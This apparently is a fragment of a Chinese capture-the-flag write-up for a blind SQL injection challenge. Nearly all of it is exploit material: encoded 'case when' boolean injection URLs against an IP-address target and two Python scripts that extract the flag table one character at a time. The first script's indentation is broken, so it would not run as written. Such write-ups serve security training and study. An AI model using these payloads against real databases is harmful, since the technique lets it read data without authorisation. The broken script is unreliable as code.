        <p>highlight_file</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28018&#x2F;index.php?cat&#x3D;200%09or%09case%09when%091%09like%091%09then%09id%09like%092%09else%09id%09like%091%09end</span><br></pre></td></tr></table></figure>

<p>如图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or case when left((select flag from flag),1) like 0x66 then id like 2 else id</span><br><span class="line">like 1 end</span><br></pre></td></tr></table></figure>

<p>即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28018&#x2F;index.php?cat&#x3D;200%09or%09case%09when%09left((select%09flag%09from%09flag),1)%09like%090x66%09then%09id%09like%092%09else%09id%09like%091%09end</span><br></pre></td></tr></table></figure>

<p>在HackBar中，点击Add Header，输入Upgrade-Insecure-Requests: 1</p>
<p>如图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">def ord2hex(string):</span><br><span class="line">    result &#x3D; &quot;&quot;</span><br><span class="line">    for i in string:</span><br><span class="line">        r &#x3D; hex(ord(i));</span><br><span class="line">        r &#x3D; r.replace(&#39;0x&#39;,&#39;&#39;)</span><br><span class="line">        result &#x3D; result+r</span><br><span class="line">    return &#39;0x&#39;+result</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28018&#x2F;&#x2F;index.php?cat&#x3D;&quot;</span><br><span class="line">tables &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.+-&#125;&#123;&#39;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1,43):</span><br><span class="line">    for j in tables:</span><br><span class="line">        payload &#x3D; &quot;200 or case when left((select flag from flag),%s) like %s then id like 2 else id like 1 end&quot;%(i,ord2hex(flag+j))</span><br><span class="line">        try:</span><br><span class="line">            r &#x3D; requests.get(url+payload)</span><br><span class="line"> except Exception as e:</span><br><span class="line">     r &#x3D; requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"> if &quot;Tow&quot; in r.text:</span><br><span class="line">     flag&#x3D;flag+j</span><br><span class="line">     print(flag)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28014/index.php?cat=100&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span>(<span class="params">strings</span>):</span> </span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">        t = hex(ord(i))</span><br><span class="line">        t = t.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        flag = flag+t</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+flag</span><br><span class="line"></span><br><span class="line">tables = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.+-&#125;&#123;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line">        payload = <span class="string">&quot; or  case    when    left((select    flag    from    flag),%s)   like    %s  then    id  like    1   else    id  like    2   end&quot;</span>%(i,ord2hex(flag+j))</span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;One&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag=flag+j</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>
